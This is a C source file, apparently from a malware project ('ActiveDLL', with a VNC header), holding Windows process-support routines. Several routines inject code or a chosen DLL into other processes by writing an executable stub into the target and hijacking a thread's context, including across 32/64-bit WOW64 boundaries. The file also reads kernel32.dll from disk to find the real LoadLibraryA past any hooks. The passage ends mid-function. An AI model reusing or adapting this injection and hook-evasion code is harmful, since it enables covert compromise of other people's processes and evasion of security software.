//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// ActiveDLL project. Version 1.4
//	
// module: pssup.c
// $Revision: 137 $
// $Date: 2013-07-23 16:57:05 +0400 (Вт, 23 июл 2013) $
// description: 
//	Processes and modules support routines

#include "vncmain.h"
#include "tlhelp32.h"



#define	szWow64				"wow64"
#define	szLoadLibraryA		"LoadLibraryA"
#define szOpen				_T("open")

#define	DLL_INIT_TIMEOUT	3000	// milliseconds


static	HANDLE	g_RandomMutex;

typedef BOOL (WINAPI *LPFN_ISWOW64PROCESS) (HANDLE, PBOOL);

typedef BOOLEAN	 (WINAPI* FUNC_RedirectWow64)(BOOLEAN Wow64FsEnableRedirection);
typedef NTSTATUS (NTAPI* FUNC_ZwWow64ReadVirtualMemory64)(HANDLE ProcessHandle, ULONG64 BaseAddress, PVOID Buffer, ULONG64 BufferLength, PULONG64 ReturnLength);
typedef NTSTATUS (NTAPI* FUNC_ZwWow64WriteVirtualMemory64)(HANDLE ProcessHandle, ULONG64 BaseAddress, PVOID Buffer, ULONG64 BufferLength, PULONG64 ReturnLength);
typedef NTSTATUS (NTAPI* FUNC_ZwWow64QueryInformationProcess64) (HANDLE hProcess, PROCESSINFOCLASS ProcessInformationClass, PVOID	pProcessInformation, ULONG uProcessInformationLength, PULONG puReturnLength);

static	FUNC_RedirectWow64						g_RedirectWow64 = NULL;
static	FUNC_ZwWow64ReadVirtualMemory64			g_ZwWow64ReadVirtualMemory64 = NULL;
static	FUNC_ZwWow64QueryInformationProcess64	g_ZwWow64QueryInformationProcess64 = NULL;

static	PSSUP_NATIVE_POINTERS	g_Wow64NativeCallPointers = {0};
static	PVOID					g_LoadLibraryPtr = NULL;
static	LPFN_ISWOW64PROCESS		g_IsWow64ProcessPtr = NULL;

//
//	Queries 64-bit process information when called from a WOW64 process.
//
static NTSTATUS PsSupQueryProcess64Information(
	HANDLE	hProcess, 
	PROCESSINFOCLASS ProcessInfoClass, 
	PVOID	pProcessInformation, 
	ULONG	uProcessInfoLength, 
	PULONG	puReturnLength
	)
{
	NTSTATUS	ntStatus = STATUS_NOT_IMPLEMENTED;

	if (!g_ZwWow64QueryInformationProcess64)
		g_ZwWow64QueryInformationProcess64 = (FUNC_ZwWow64QueryInformationProcess64)GetProcAddress(GetModuleHandleA(szNtdll), "ZwWow64QueryInformationProcess64");

	if (g_ZwWow64QueryInformationProcess64)
		ntStatus = g_ZwWow64QueryInformationProcess64(hProcess, ProcessInfoClass, pProcessInformation, uProcessInfoLength, puReturnLength);
	
	return(ntStatus);
}
					

//
//	Converts client.dll name into client64.dll and back.
//	Returns new converted name. The caller is responsable for freeing it.
//
LPTSTR	PsSupNameChangeArch(
	LPTSTR ModuleName
	)
{
	LPTSTR	ArcStr, NewName = NULL;

	if (ModuleName && (NewName = hAlloc(lstrlen(ModuleName) + 3*sizeof(_TCHAR))))
	{
		lstrcpy(NewName, ModuleName);
		if (ArcStr = _tcsrchr(NewName, '.'))
		{
			if (ArcStr[-2] == '6')
				ArcStr -= 2;
			else
			{
				ArcStr[0] = '6';
				ArcStr[1] = '4';
				ArcStr += 2;
			}
			ArcStr[0] = 0;
			lstrcat(NewName, szExtDll);
		}	// if (ArcStr = _tcsrchr(NewName, '.'))
	}	// if (NewName = hAlloc(lstrlen(ModuleName) + 3*sizeof(_TCHAR)))
	return(NewName);
}


//
//	Returns TRUE if the specified PID or handle belongs to a WOW64 process.
//
BOOL	PsSupIsWow64Process(
	ULONG	Pid,
	HANDLE	hProcess
	)
{
	BOOL Ret =  FALSE;
	if (g_IsWow64ProcessPtr == NULL ){
		g_IsWow64ProcessPtr = (LPFN_ISWOW64PROCESS) GetProcAddress(GetModuleHandleA(g_Kernel32),"IsWow64Process");
	}
	if (g_IsWow64ProcessPtr)
	{
		if (Pid)
			hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, Pid);

		if (hProcess)
		{
			if (!g_IsWow64ProcessPtr(hProcess, &Ret))
				// An error occurred: unable to get OS architecture type. Assume we are on x86 and process is not WOW64 process.
				Ret = FALSE;

			if (Pid)
				CloseHandle(hProcess);
		}	// if (hProcess)
	}	// if (fnIsWow64Process)
	return(Ret);
}


//
//	Enables or disables WOW64 file system redirection.
//
VOID PsSupSetWow64Redirection(
	BOOL Enable		// specify TRUE to enable redirection, FALSE to disable it.
	)
{
	if (!g_RedirectWow64)
		g_RedirectWow64 = (FUNC_RedirectWow64)GetProcAddress(GetModuleHandleA(g_Kernel32), "Wow64EnableWow64FsRedirection");

	if (g_RedirectWow64)
		(g_RedirectWow64)(Enable);
}
//
//	Calculates REAL address of the specified exported function from the specified module unsing module image file.
//
PVOID PsSupGetRealFunctionAddress(
	HMODULE	hModule,
	PCHAR	FunctionName
	)
{
	LPTSTR	ModulePath;
	PVOID	pFunction = NULL;
	PEXPORT_ENTRY	pExpEntry;
	EXPORT_ENTRY	ExpEntry;
	ULONG	ExpOffset, bRead;
	HANDLE	hFile;

	// Getting target module full path
	if (PsSupGetModulePath(hModule, &ModulePath) == NO_ERROR)
	{
		// Looking for the export entry of the specified exported function
		if (pExpEntry = PeSupGetExportEntry(hModule, FunctionName))
		{
			// Converting export entry VA into the image file offset
			if (ExpOffset = PeSupRvaToFileOffset(hModule, (ULONG)((ULONG_PTR)pExpEntry - (ULONG_PTR)hModule)))
			{
				// Opening the image file
				hFile = CreateFile(ModulePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
				if (hFile != INVALID_HANDLE_VALUE)
				{
					if (SetFilePointer(hFile, ExpOffset, NULL, FILE_BEGIN) == ExpOffset)
					{
						// Reading original export entry value from the file
						if (ReadFile(hFile, &ExpEntry, sizeof(EXPORT_ENTRY), &bRead, NULL) && bRead == sizeof(EXPORT_ENTRY))
							pFunction = (PVOID)((PCHAR)hModule + ExpEntry);
					}
					CloseHandle(hFile);
				}	// if (hFile != INVALID_HANDLE_VALUE)
			}	// if (ExpOffset = PeSupRvaToFileOffset(hModule, (ULONG)((ULONG_PTR)pExpEntry - (ULONG_PTR)hModule)))
		}	// if (pExpEntry = PeSupGetExportEntry(hModule, FunctionName))
		hFree(ModulePath);
	}	// if (PsSupGetModulePath(hModule, &ModulePath) == NO_ERROR)

	return(pFunction);
}


//
//	Returns the pointer to the kernel32!LoadLibraryA function within the current process.
//	Since the function could be already hooked by an other soft it reads kernel32.dll file to resolve the real address.
//
PVOID	GetLoadLibraryPtr(VOID)
{
	PVOID pLoadLibrary =  NULL;

	// Checking if the pointer was already resolved
	if (!g_LoadLibraryPtr)
	{
		// Resolving the function address
		if (pLoadLibrary = PsSupGetRealFunctionAddress(GetModuleHandle(g_Kernel32), szLoadLibraryA))
			g_LoadLibraryPtr = pLoadLibrary;
	}
	else
		pLoadLibrary = g_LoadLibraryPtr;

	return(pLoadLibrary);		
}


//
//	Returns pointer to LDR_DATA_TABLE_ENTRY for the image loaded at the specified ImageBase within the current process.
//	Note: LdrLoadedLock must be held while walking through the PEB.XXXOrderModuleList-s and working with 
//		an LDR_DATA_TABLE_ENTRY structure. So it is safe to call this routine from a DllMain because 
//		the LdrLoadedLock is stays held there.
//	In case of no entry found or an error occured the function returns NULL.
//
PLDR_DATA_TABLE_ENTRY PsSupGetLdrDataTableEnty(
	PVOID	ImageBase
	)
{
	PLDR_DATA_TABLE_ENTRY pLdrEntry = NULL;
	PROCESS_BASIC_INFORMATION	ProcBasicInfo;
	PPEB						pPeb;
	PLIST_ENTRY					pEntry;

	if (NT_SUCCESS(ZwQueryInformationProcess(GetCurrentProcess(), ProcessBasicInformation, &ProcBasicInfo, sizeof(PROCESS_BASIC_INFORMATION), NULL)))
	{
		// Let's check, maybe there's no PEB address. Who knows...
		if (pPeb = (PPEB)ProcBasicInfo.PebBaseAddress)
		{
			pEntry = pPeb->Ldr->InInitializationOrderModuleList.Flink;

			// Walking through the InitializationOrderModuleList
			while(pEntry != &pPeb->Ldr->InInitializationOrderModuleList)
			{
				pLdrEntry = (PLDR_DATA_TABLE_ENTRY)CONTAINING_RECORD(pEntry, LDR_DATA_TABLE_ENTRY, InInitializationOrderModuleList);

				if (pLdrEntry->DllBase == ImageBase)
					break;

				pLdrEntry = NULL;
				pEntry = pEntry->Flink;
			}	// while(pEntry != &pPeb->InInitializationOrderModuleList)
		}	// if (pPeb = (PPEB_LDR_DATA)ProcBasicInfo.PebBaseAddress)
	}	// if (NT_SUCCESS(ZwQueryInformationProcess(

	return(pLdrEntry);
}
	


#ifdef _WIN64
//
//	Enumerates all modules of the specified WOW64 process from a native 64-bit process.
//	Queries each module information.
//
static BOOL	PsSupQueyProcessModulesWow64(
	HANDLE							hProcess,
	PSYSTEM_MODULE_INFORMATION64	Buffer,
	ULONG							Size,
	PULONG							rSize
	)
{
	BOOL	Ret = FALSE;
	ULONG	Index = 0, bSize = 0;
	SIZE_T	bRead;
	PWCHAR	NameBuf = NULL;
	NTSTATUS	ntStatus;
	ULONG_PTR	pFirst, pEntry;
	PPROCESS_INFO32		ProcInfo = NULL;
	PSYSTEM_MODULE64	ModInfo;
	PROCESS_WOW64_INFORMATION	BasicInfo;


	do	// not a loop 
	{
		ntStatus = ZwQueryInformationProcess(hProcess, ProcessWow64Information, &BasicInfo, sizeof(PROCESS_WOW64_INFORMATION), (PULONG)&bRead);
		if (!NT_SUCCESS(ntStatus))
			// Failed querying process info
			break;

		if (!(NameBuf = hAlloc(MAX_SYSTEM_MODULE_NAME_LENGTH * 2)))
			// Insufficient resources
			break;

		if (!(ProcInfo = hAlloc(sizeof(PROCESS_INFO32))))
			// Insufficient resources
			break;

		if (!ReadProcessMemory(hProcess, BasicInfo.Wow64PebBaseAddress, &ProcInfo->Peb, sizeof(PEB32), &bRead))
			// Failed reading target PEB
			break;

		ASSERT(bRead == sizeof(PEB32));
	

		if (!ReadProcessMemory(hProcess, (PVOID)(ULONG_PTR)ProcInfo->Peb.Ldr, &ProcInfo->LdrData, sizeof(PEB_LDR_DATA32), &bRead))
			// Failed reading PEB loader data
			break;

		ASSERT(bRead == sizeof(PEB_LDR_DATA32));


		pFirst = ProcInfo->Peb.Ldr + ((ULONG_PTR)&ProcInfo->LdrData.InLoadOrderModuleList - (ULONG_PTR)&ProcInfo->LdrData);
		pEntry = ProcInfo->LdrData.InLoadOrderModuleList.Flink;

		bSize = sizeof(ULONG);
		ModInfo = &Buffer->aSM[0];

		while(pEntry != pFirst)
		{
			if (!ReadProcessMemory(hProcess, (PVOID)pEntry, &ProcInfo->LdrEntry, sizeof(LDR_DATA_TABLE_ENTRY32), &bRead))
				// Failed reading data table entry
				break;

			pEntry = ProcInfo->LdrEntry.InLoadOrderModuleList.Flink;

			bSize += sizeof(SYSTEM_MODULE64);
			if (bSize <= Size)
			{
				ULONG	NameLen = ProcInfo->LdrEntry.FullDllName.Length/2;

				ModInfo->Index = (USHORT)Index;
				ModInfo->Flags = ProcInfo->LdrEntry.Flags;
				ModInfo->LoadCount = ProcInfo->LdrEntry.LoadCount;
				ModInfo->Size = ProcInfo->LdrEntry.SizeOfImage;
				ModInfo->Base = ProcInfo->LdrEntry.DllBase;

				if ((NameLen < MAX_SYSTEM_MODULE_NAME_LENGTH) &&
					ReadProcessMemory(hProcess, (PVOID)(ULONG_PTR)ProcInfo->LdrEntry.FullDllName.Buffer, (PCHAR)NameBuf, ProcInfo->LdrEntry.FullDllName.Length, &bRead))
				{
					ULONG i;
					for (i=0; i<NameLen; i++)
						ModInfo->ImageName[i] = (CHAR)NameBuf[i];

					ModInfo->ImageName[NameLen] = 0;
					ModInfo->ModuleNameOffset = (USHORT)(strrchr((PCHAR)&ModInfo->ImageName, '\\') - (PCHAR)&ModInfo->ImageName) + 1;
				}
				
				ModInfo += 1;
				Index += 1;
			}	// if (bSize <= Size)
		}	// while(pEntry != pFirst)

		if (Buffer)
			Buffer->uCount = Index;

	} while(FALSE);
	
	if (NameBuf)
		hFree(NameBuf);

	if (ProcInfo)
		hFree(ProcInfo);

	if (rSize)
		*rSize = bSize;

	if (bSize <= Size && bSize != 0)
		Ret = TRUE;

	return(Ret);
}


//
//	Reads the memory of the process with other architecture.
//
BOOL	PsSupReadProcessMemoryArch(
	HANDLE		hProcess, 
	ULONGLONG	BaseAddress, 
	PVOID		Buffer, 
	ULONG		Size, 
	SIZE_T*		pBytesRead
	)
{
	return(ReadProcessMemory(hProcess, (PVOID)BaseAddress, Buffer, Size, pBytesRead));
}

#else	// _WIN64


//
//	Reads memory from the 64-bit process when called from a WOW64 process.
//	Returns number of bytes read, or 0.
//
static ULONG PsSupReadProcess64Memory(
	HANDLE		hProcess,
	PULONG64	pBaseAddress,
	PVOID		Buffer,
	ULONG		Size
	)
{
	ULONG		Ret = 0;
	ULONG64		bRead = 0;
	NTSTATUS	ntStatus;

	if (!g_ZwWow64ReadVirtualMemory64)
		g_ZwWow64ReadVirtualMemory64 = (FUNC_ZwWow64ReadVirtualMemory64)GetProcAddress(GetModuleHandleA(szNtdll), "ZwWow64ReadVirtualMemory64");

	if (g_ZwWow64ReadVirtualMemory64)
	{
		ntStatus = (g_ZwWow64ReadVirtualMemory64)(hProcess, *pBaseAddress, Buffer, (ULONG64)Size, &bRead);
		if (NT_SUCCESS(ntStatus))
			Ret = (ULONG)bRead;
	}

	return(Ret);
}



//
//	Reads the memory of the process with other architecture.
//
BOOL	PsSupReadProcessMemoryArch(
	HANDLE		hProcess, 
	ULONGLONG	BaseAddress, 
	PVOID		Buffer, 
	ULONG		Size, 
	SIZE_T*		pBytesRead
	)
{
	return((BOOL)(*pBytesRead = PsSupReadProcess64Memory(hProcess, &BaseAddress, Buffer, Size)));
}


//
//	Enumerates all modules of a 64-bit process from a WOW64 process.
//	Queries each process information.
//
static	BOOL	PsSupWow64QueyProcessModules64(
	HANDLE							hProcess,
	PSYSTEM_MODULE_INFORMATION64	Buffer,
	ULONG							Size,
	PULONG							rSize
	)
{
	BOOL	Ret = FALSE;
	ULONG	Index = 0, bSize = 0, bRead;
	PWCHAR	NameBuf = NULL;
	NTSTATUS	ntStatus;
	ULONGLONG	pFirst, pEntry;
	PPROCESS_INFO64		ProcInfo = NULL;
	PSYSTEM_MODULE64	ModInfo;
	PROCESS_BASIC_INFORMATION64	BasicInfo;

	HMODULE	hNtdll = GetModuleHandleA(szNtdll);
	FUNC_ZwWow64QueryInformationProcess64	pZwWow64QueryInformationProcess64 = 
		(FUNC_ZwWow64QueryInformationProcess64)GetProcAddress(hNtdll, "ZwWow64QueryInformationProcess64");

	ASSERT(PsSupIsWow64Process(g_CurrentProcessId, 0));

	do	// not a loop 
	{
		if (!pZwWow64QueryInformationProcess64)
			// API function not found
			break;

		ntStatus = (pZwWow64QueryInformationProcess64)(hProcess, ProcessBasicInformation, &BasicInfo, sizeof(PROCESS_BASIC_INFORMATION64), &bRead);
		if (!NT_SUCCESS(ntStatus))
			// Failed querying process info
			break;

		if (!(NameBuf = hAlloc(MAX_SYSTEM_MODULE_NAME_LENGTH * 2)))
			// Insufficient resources
			break;

		if (!(ProcInfo = hAlloc(sizeof(PROCESS_INFO64))))
			// Insufficient resources
			break;

		if (!(bRead = PsSupReadProcess64Memory(hProcess, &BasicInfo.PebBaseAddress, &ProcInfo->Peb, sizeof(PEB64))))
			// Failed reading target PEB
			break;

		ASSERT(bRead == sizeof(PEB64));
	
		if (!(bRead = PsSupReadProcess64Memory(hProcess, &ProcInfo->Peb.Ldr, &ProcInfo->LdrData, sizeof(PEB_LDR_DATA64))))
			// Failed reading PEB loader data
			break;

		ASSERT(bRead == sizeof(PEB_LDR_DATA64));

		pFirst = ProcInfo->Peb.Ldr + (ULONG64)((ULONG_PTR)&ProcInfo->LdrData.InLoadOrderModuleList - (ULONG_PTR)&ProcInfo->LdrData);
		pEntry = ProcInfo->LdrData.InLoadOrderModuleList.Flink;

		bSize = sizeof(ULONG);
		ModInfo = &Buffer->aSM[0];

		while(pEntry != pFirst)
		{
			if (!(bRead = PsSupReadProcess64Memory(hProcess, &pEntry, &ProcInfo->LdrEntry, sizeof(LDR_DATA_TABLE_ENTRY64))))
				// Failed reading data table entry
				break;
			pEntry = ProcInfo->LdrEntry.InLoadOrderModuleList.Flink;

			bSize += sizeof(SYSTEM_MODULE64);
			if (bSize <= Size)
			{
				ULONG	NameLen = ProcInfo->LdrEntry.FullDllName.Length/2;

				ModInfo->Index = (USHORT)Index;
				ModInfo->Flags = ProcInfo->LdrEntry.Flags;
				ModInfo->LoadCount = ProcInfo->LdrEntry.LoadCount;
				ModInfo->Size = ProcInfo->LdrEntry.SizeOfImage;
				ModInfo->Base = ProcInfo->LdrEntry.DllBase;

				if ((NameLen < MAX_SYSTEM_MODULE_NAME_LENGTH) &&
					(bRead = PsSupReadProcess64Memory(hProcess, &ProcInfo->LdrEntry.FullDllName.Buffer, (PCHAR)NameBuf, ProcInfo->LdrEntry.FullDllName.Length)))
				{
					ULONG i;
					for (i=0; i<NameLen; i++)
						ModInfo->ImageName[i] = (CHAR)NameBuf[i];

					ModInfo->ImageName[NameLen] = 0;
					ModInfo->ModuleNameOffset = (USHORT)(strrchr((PCHAR)&ModInfo->ImageName, '\\') - (PCHAR)&ModInfo->ImageName) + 1;
				}
				
				ModInfo += 1;
				Index += 1;
			}	// if (bSize <= Size)
		}	// while(pEntry != pFirst)

		if (Buffer)
			Buffer->uCount = Index;

	} while(FALSE);
	
	if (NameBuf)
		hFree(NameBuf);

	if (ProcInfo)
		hFree(ProcInfo);

	if (rSize)
		*rSize = bSize;

	if (bSize <= Size && bSize != 0)
		Ret = TRUE;

	return(Ret);
}

//
//	Resolves pointers to native x64 functions used by WOW64 injects.
//
PPSSUP_NATIVE_POINTERS PsSupResolveNativePointers(VOID)
{
	PPSSUP_NATIVE_POINTERS	Pointers = NULL;
	if (!g_Wow64NativeCallPointers.pZwGetContextThread)
	{
		do
		{
			if (!(g_Wow64NativeCallPointers.pZwGetContextThread = PsSupGetProcessFunctionAddressArch(NtCurrentProcess(), szNtdll, "ZwGetContextThread")))
				break;

			if (!(g_Wow64NativeCallPointers.pZwSetContextThread = PsSupGetProcessFunctionAddressArch(NtCurrentProcess(), szNtdll, "ZwSetContextThread")))
				break;

			Pointers = &g_Wow64NativeCallPointers;
		} while(FALSE);

	}
	else
		Pointers = &g_Wow64NativeCallPointers;

	return(Pointers);
}


//
//	Injects a 64-bit stub into a 64-bit process from a WOW64 process and executes it.
//	Allocates a memory buffer within target process, copies the specified INJECT_CONTEXT into it.
//	Sets target thread context so, it will execute INJECT_CONTEXT.InjectStub routine which will call INJECT_CONTEXT.pFunction 
//	 function with INJECT_CONTEXT.pContext value as single parameter.
//
WINERROR PsSupWow64InjectExecuteStub64(
	LPPROCESS_INFORMATION	lpProcessInformation,		// target process information structure
	PINJECT_CONTEXT			InjCtx,
	ULONG					Flags
	)
{
	WINERROR	Status = ERROR_UNSUCCESSFULL;
	NTSTATUS	ntStatus;
	ULONG_PTR	ProcessMem;
	ULONG		wBytes;
	PVOID		pInjectStub;
	CONTEXT64	Ctx64 = {0};
	PPSSUP_NATIVE_POINTERS	Wow64CallPointers = PsSupResolveNativePointers();

	ASSERT(g_CurrentProcessFlags & GF_WOW64_PROCESS);

	Ctx64.ContextFlags = _CONTEXT_AMD64 | _CONTEXT_CONTROL | _CONTEXT_INTEGER;

	do	// not a loop
	{
		pInjectStub = &Wow64InjectStub;
#if _DEBUG
		// Some function addresses in DEBUG build are addresses of JMPs to real functions.
		// Calculating real stub address.
		if (*(PUCHAR)pInjectStub == OP_JMP_NEAR) 
			pInjectStub = (PVOID)((ULONG_PTR)pInjectStub + *(PULONG)((PCHAR)pInjectStub + sizeof(UCHAR)) + 5);
#endif
		memcpy(&InjCtx->InjectStub, pInjectStub, MAX_INJECT_STUB);

		// Allocating a memory buffer within the target process
		ProcessMem = (ULONG_PTR)VirtualAllocEx(lpProcessInformation->hProcess, NULL, sizeof(INJECT_CONTEXT), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		if (!ProcessMem)
			break;

		// Querying target thread's context
		ntStatus = Wow64NativeCall(Wow64CallPointers->pZwGetContextThread, 2, (ULONG64)lpProcessInformation->hThread, (ULONG64)&Ctx64);
		if (!NT_SUCCESS(ntStatus))
		{
			Status = ERROR_ACCESS_DENIED;
			break;
		}
		
		// Adjusting internal context variables
		if (InjCtx->pContext == (ULONGLONG)&InjCtx->DllPath)
			InjCtx->pContext = (ULONGLONG)ProcessMem + FIELD_OFFSET(INJECT_CONTEXT, DllPath);

		InjCtx->pRetpoint = Ctx64.Rip;

		// Writing INJECT_CONTEXT into the target process
		if (!WriteProcessMemory(lpProcessInformation->hProcess, (PVOID)ProcessMem, InjCtx, sizeof(INJECT_CONTEXT), &wBytes))
			break;

		// Adjusting target thread's context values
		Ctx64.Rax = ProcessMem;
		Ctx64.Rip = (DWORD64)&((PINJECT_CONTEXT)ProcessMem)->InjectStub;

		// Setting target thread's context
		ntStatus = Wow64NativeCall(Wow64CallPointers->pZwSetContextThread, 2, (ULONG64)lpProcessInformation->hThread, (ULONG64)&Ctx64);
		if (!NT_SUCCESS(ntStatus))
		{
			Status = ERROR_ACCESS_DENIED;
			break;
		}
		
		// Resuming target thread
		ResumeThread(lpProcessInformation->hThread);

		// Waiting to let the DLL initialize
		Sleep(500);

		// Suspending target thread
		SuspendThread(lpProcessInformation->hThread);

		Status = NO_ERROR;
	
	} while(FALSE);

	if (Status == ERROR_UNSUCCESSFULL)
		Status = GetLastError();

	return(Status);
}

//
//	Injects a 64-bit DLL into a 64-bit process from a WOW64 process.
//
WINERROR PsSupWow64InjectDll64(
	LPPROCESS_INFORMATION lpProcessInformation,		// target process information structure
	LPTSTR	DllPath									// full path to the DLL should be injected
	)
{
	WINERROR	Status = ERROR_NOT_ENOUGH_MEMORY;
	PINJECT_CONTEXT	InjCtx;

	ASSERT(g_CurrentProcessFlags & GF_WOW64_PROCESS);

	// Allocating INJECT_CONTEXT structure
	if (InjCtx = hAlloc(sizeof(INJECT_CONTEXT)))
	{
		memset(InjCtx, 0, sizeof(INJECT_CONTEXT));

		// Looking for the load function address within target process
		if (InjCtx->pFunction = PsSupGetProcessFunctionAddressArch(lpProcessInformation->hProcess, g_Kernel32, szLoadLibraryA))
		{
			InjCtx->pContext = (ULONGLONG)&InjCtx->DllPath;
			lstrcpy((LPTSTR)&InjCtx->DllPath, DllPath);

			// Injecting DLL-load stub into the target process
			Status = PsSupWow64InjectExecuteStub64(lpProcessInformation, InjCtx, 0);
		}
		else
			Status = ERROR_FILE_NOT_FOUND;

		hFree(InjCtx);
	}	// if (InjCtx = hAlloc(sizeof(INJECT_CONTEXT)))

	return(Status);
}

#endif	// ifndef _WIN64


//
//	Injects a 64-bit stub from a 64-bit process, or a 32-bit stub from a 32-bit process, or a 32-bit stub from a 64-bit process.
//	Creates INJECT_CONTEXT structure, allocates a memory buffer within the target process, copies INJECT_CONTEXT into it.
//	Sets target thread context so, it will execute INJECT_CONTEXT.InjectStub routine.
//
WINERROR PsSupInjectExecuteStub(
	LPPROCESS_INFORMATION	lpProcessInformation,		// target process information structure
	PINJECT_CONTEXT			InjCtx,
	ULONG					Flags
	)
{
	WINERROR	Status = ERROR_UNSUCCESSFULL;
	NTSTATUS	ntStatus;
	ULONG_PTR	ProcessMem;
	SIZE_T		wBytes;
	CONTEXT		Ctx = {0};
	PVOID		pInjectStub;

	Ctx.ContextFlags = CONTEXT_CONTROL | CONTEXT_INTEGER;

	do	// not a loop
	{
		// Allocating a memory buffer within the target process
		ProcessMem = (ULONG_PTR)VirtualAllocEx(lpProcessInformation->hProcess, NULL, sizeof(INJECT_CONTEXT), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		if (!ProcessMem)
			break;

		// Querying target thread's context
		ntStatus = NtGetContextThread(lpProcessInformation->hThread, &Ctx);
		if (!NT_SUCCESS(ntStatus))
		{
			Status = ERROR_ACCESS_DENIED;
			break;
		}

#ifdef	_WIN64
		InjCtx->pRetpoint = Ctx.Rip;
		Ctx.Rax = ProcessMem;
		Ctx.Rip = (DWORD64)&((PINJECT_CONTEXT)ProcessMem)->InjectStub;
		if (Flags & INJECT_WOW64_TARGET)
			pInjectStub = &Wow64InjectStub;
		else
			pInjectStub = &Win64InjectStub;
#else
		InjCtx->pRetpoint = Ctx.Eip;
		Ctx.Eax = (ULONG)ProcessMem;
		Ctx.Eip = (ULONG)(ULONG_PTR)&((PINJECT_CONTEXT)ProcessMem)->InjectStub;
		pInjectStub = &Win32InjectStub;
#endif

#if _DEBUG
		// Some function addresses in DEBUG build could be addresses of JMPs to real functions.
		// Calculating real stub address here.
		if (*(PUCHAR)pInjectStub == OP_JMP_NEAR) 
			pInjectStub = (PVOID)((ULONG_PTR)pInjectStub + *(PULONG)((PCHAR)pInjectStub + sizeof(UCHAR)) + 5);
#endif

		// Copying inject stub code to the inject context.
		memcpy(&InjCtx->InjectStub, pInjectStub, MAX_INJECT_STUB);

		// Adjusting internal context variables
		if (InjCtx->pContext == (ULONGLONG)&InjCtx->DllPath)
			InjCtx->pContext = (ULONGLONG)ProcessMem + FIELD_OFFSET(INJECT_CONTEXT, DllPath);

		// Writing INJECT_CONTEXT into the target process
		if (!WriteProcessMemory(lpProcessInformation->hProcess, (PVOID)ProcessMem, InjCtx, sizeof(INJECT_CONTEXT), &wBytes))
			break;

		// Setting target thread's context
		ntStatus = NtSetContextThread(lpProcessInformation->hThread, &Ctx);
		if (!NT_SUCCESS(ntStatus))
		{
			Status = ERROR_ACCESS_DENIED;
			break;
		}
		
		// Resuming target thread
		ResumeThread(lpProcessInformation->hThread);

		// Waiting to let the function complete
		Sleep(500);

		// Suspending target thread
		SuspendThread(lpProcessInformation->hThread);

		Status = NO_ERROR;
	
	} while(FALSE);

	if (Status == ERROR_UNSUCCESSFULL)
		Status = GetLastError();

	return(Status);
}

//
//	Calls the specified function within the specified target process.
//
WINERROR PsSupExecuteRemoteFunction(
	LPPROCESS_INFORMATION	lpProcessInformation,	// target process information structure
	PVOID					pFunction,				// address of a function within the target process
	PVOID					pContext,				// address of the context value passed to the function
	ULONG					Flags					// various flags
	)
{
	WINERROR Status = ERROR_NOT_ENOUGH_MEMORY;
	PINJECT_CONTEXT	InjCtx;

	if (InjCtx = hAlloc(sizeof(INJECT_CONTEXT)))
	{
		memset(InjCtx, 0, sizeof(INJECT_CONTEXT));
		InjCtx->pFunction = (ULONGLONG)pFunction;
		InjCtx->pContext = (ULONGLONG)pContext;
#ifndef _M_AMD64
		if (!(Flags & INJECT_WOW64_TARGET) && (g_CurrentProcessFlags & GF_WOW64_PROCESS))
			Status = PsSupWow64InjectExecuteStub64(lpProcessInformation, InjCtx, Flags);
		else
#endif
			Status = PsSupInjectExecuteStub(lpProcessInformation, InjCtx, Flags);
		hFree(InjCtx);
	}	// if (InjCtx = hAlloc(sizeof(INJECT_CONTEXT)))

	return(Status);
}



//
//	Injects a 64-bit DLL from a 64-bit process, or a 32-bit DLL from a 32-bit process, or a 32-bit DLL from a 64-bit process.
//	Creates INJECT_CONTEXT structure, allocates a memory buffer within the target process, copies INJECT_CONTEXT into it.
//	Sets target thread context so, it will execute INJECT_CONTEXT.InjectStub routine.
//
WINERROR PsSupInjectDllWithStub(
	LPPROCESS_INFORMATION lpProcessInformation,		// target process information structure
	LPTSTR	DllPath,									// full path to the DLL should be injected
	ULONG	Flags
	)
{
	WINERROR	Status = ERROR_NOT_ENOUGH_MEMORY;
	ULONG_PTR	Function;
	PINJECT_CONTEXT	InjCtx = NULL;

	do	// not a loop
	{
		// Looking for the DLL-load function address within the target process
#ifdef _WIN64
		if (Flags & INJECT_WOW64_TARGET)
		{
			if (!(Function = (ULONG_PTR)PsSupGetProcessFunctionAddressArch(lpProcessInformation->hProcess, g_Kernel32, szLoadLibraryA)))
			{
				Status = ERROR_FILE_NOT_FOUND;
				break;
			}
		}
		else
#endif
			Function = (ULONG_PTR)GetLoadLibraryPtr();

		// Allocating INJECT_CONTEXT structure
		if (InjCtx = hAlloc(sizeof(INJECT_CONTEXT)))
		{
			// Initializing INJECT_CONTEXT
			memset(InjCtx, 0, sizeof(INJECT_CONTEXT));
			InjCtx->pFunction = (ULONGLONG)Function;
			InjCtx->pContext = (ULONGLONG)&InjCtx->DllPath;
			lstrcpy((LPTSTR)&InjCtx->DllPath, DllPath);

			Status = PsSupInjectExecuteStub(lpProcessInformation, InjCtx, Flags);

			hFree(InjCtx);
		}
	} while(FALSE);
		
	return(Status);
}




//
//	Returns base of the specified module loaded withing the specified process of other architecture.
//
WINERROR PsSupGetProcessModuleBaseArch(
	HANDLE		hProcess,		// Handle to a process with PROCESS_QUERY_INFORMATION and PROCESS_VM_READ access
	PCHAR		ModuleName,		// short module name (case insensitive), can be NULL to search for the process main module
	ULONG64*	pModuleBase,	// returned module base
	PULONG		pModuleSize		// returned module size (OPTIONAL)
				)
 {
	 ULONG		bSize, Size, i;
	 WINERROR	Status = ERROR_FILE_NOT_FOUND;
	 PSYSTEM_MODULE_INFORMATION64	SysModInfo = NULL;
	 PSYSTEM_MODULE64	ModInfo;



#ifdef _WIN64
	 PsSupQueyProcessModulesWow64(hProcess, NULL, 0, &bSize);
	 Size = bSize;
  	 // Using vAlloc here due to a large amount of memory needed that maybe will not fit our heap.
	 SysModInfo = vAlloc(Size);

	 while (SysModInfo && !PsSupQueyProcessModulesWow64(hProcess, SysModInfo, Size, &bSize) && Size < bSize)
#else
	 ASSERT(PsSupIsWow64Process(g_CurrentProcessId, 0));

	 PsSupWow64QueyProcessModules64(hProcess, NULL, 0, &bSize);
	 Size = bSize;
	 // Using vAlloc here due to a large amount of memory needed that maybe will not fit our heap.
